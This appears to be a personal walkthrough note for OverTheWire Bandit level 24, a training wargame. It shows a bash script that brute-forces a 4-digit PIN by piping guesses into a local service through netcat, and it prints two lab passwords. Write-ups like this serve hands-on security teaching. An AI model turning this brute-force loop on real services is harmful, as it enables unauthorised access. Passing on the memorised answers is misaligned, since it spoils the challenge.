- ssh bandit24@bandit.labs.overthewire.org -p2220
- mkdir /tmp/dofox; cd /tmp/dofox
- nano test.sh
```
#!/bin/bash

password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
target="nc localhost 30002"

for i in {0000..9999}; do
	echo "$password  $i"
done | $target | grep -v Wrong
```
- chmod +x test.sh
- ./test.sh
> uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

continue to [[level 25]]
